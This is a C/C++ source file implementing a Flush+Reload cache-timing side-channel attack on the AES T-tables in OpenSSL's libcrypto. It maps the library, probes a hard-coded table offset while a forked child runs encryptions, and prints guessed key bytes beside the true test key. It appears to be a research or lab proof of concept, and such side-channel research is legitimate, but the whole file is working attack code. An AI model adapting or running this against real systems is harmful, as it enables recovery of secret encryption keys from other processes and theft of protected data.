#include <stdio.h>
#include <algorithm>
#include <pthread.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/types.h>
#include "../../cacheutils.h"
#include <map>
#include <vector>

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (300)

// more encryptions show features more clearly
#define NUMBER_OF_ENCRYPTIONS (1064)

unsigned char key[] =
{
  0x11, 0x5d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0x7c, 0x4f, 0x6e, 0x9c,
  0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

std::map<char*, std::map<size_t, size_t> > timings[4];

char* base;
char* probe;
char* end;

uint64_t basetime;

int flushReload(int l){
  int count = 0;
  size_t time = 0;
  size_t delta = 0;
  uint64_t timeForStarting = rdtsc(); 
  for(int i=0; i < 2; i++){
            for(int j=0; j < 4*1024; j+=64){
              count = 0;
              for(int k=0; k <NUMBER_OF_ENCRYPTIONS; k++){
                //printf("%d %d running flush %d\n",i,j,k);
                flush(probe + j);
                for (int p = 0; p < 25; ++p)
                  sched_yield();
                //usleep(100);
                time = rdtsc();
                maccess(probe + j);
                delta = rdtsc() - time;
                //arr[k] = rdtsc();
                if (delta < MIN_CACHE_MISS_CYCLES){
                  count++;
                }
              }
              timings[l][probe+j][i] = count;
            }
  }
  return 0;
}

int printAll(){
  //printf("time taken by child stop: %ld  start: %ld diff:%ld \n", rdtsc()-basetime,timeForStarting-basetime,rdtsc() - timeForStarting);
    int a[16], b[16];
    int j;
    for(int l=0; l<4; l++){   
    int i = 0;
       //printf("----------------\n----------- for %d set --------------\n ----------------\n ", l);
          for (auto ait : timings[l])
          {
            if(i%16 == 0){
              //printf("----------------------------------\n  Te%d \n", 3-i/16);
              
            }
            //printf("%d ", i%16); 
            //printf("%p", (void*) (ait.first - base));
            j = 0;  
            for (auto kit : ait.second)
            {
              if(j ==0)
                a[i%16] = kit.second;
              else
                b[i%16] = kit.second;
              j++;
              //printf(",%lu", kit.second);
            }
            i++;
            if(i%16 == 0){
              int d = std::distance(b,std::max_element(b,b+16));
              if(b[d] > 900){
                if(b[d-1] > b[d] - 30)  
                  d--;
                  printf("\nposition:%d original:%x possible:%x value:%d ",l*4 + (3 - abs(i-1)/16), key[l*4 + (3 - abs(i-1)/16)], d^15 ,b[d]);             
              }  
              else{
                d = std::distance(a,std::max_element(a,a+16));
                if(a[d-1] > a[d] - 30)  
                  d--;
                printf("\nposition:%d original:%x possible:%x value:%d ",l*4 + (3 - abs(i-1)/16), key[l*4 + (3 - abs(i-1)/16)], d^15 ,a[d]);             
              }
            }

            //printf("\n");
          }
    }
  //for(int i=0; i<NUMBER_OF_ENCRYPTIONS; i++)
  //  printf("child %d %d\n", i, abs(arr[i])); 
  //printf("child ended");
  return 0;
}


int main()
{
  basetime = rdtsc();
  int fd = open("./libcrypto.so", O_RDONLY);
  int arr[NUMBER_OF_ENCRYPTIONS];
  char buffer[50];
  if(fd == -1){
      printf("can't open the file\n");
      return 0;
  }
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);
  end = base + size;

  probe = base + 0x11F7A0;
  for(int l=0; l<4; l++){
    pid_t s = fork();
    if(s != 0){
      flushReload(l);
    } else {
      snprintf(buffer, sizeof(buffer),"LD_PRELOAD=$PWD/libcrypto.so ./encrypt %d",l); 
      int status = system(buffer);
      return 0;
    }
    wait(); 
  }

  printAll();

  close(fd);
  munmap(base, map_size);
  //printf("parent ended");
  fflush(stdout);
  return 0;
}

